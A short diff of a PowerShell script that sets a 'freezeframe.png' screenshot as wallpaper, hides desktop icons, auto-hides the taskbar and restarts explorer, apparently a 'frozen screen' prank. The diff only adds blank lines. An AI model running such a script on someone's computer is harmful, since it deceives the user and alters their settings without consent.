@@ -32,9 +32,11 @@ SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniCh
 Add-Type -TypeDefinition $setwallpapersrc
 [wallpaper]::SetWallpaper("c:\freezeframe.png")
 
+
 $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
 &{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}
 Get-Process "explorer"| Stop-Process
+
 
 exit
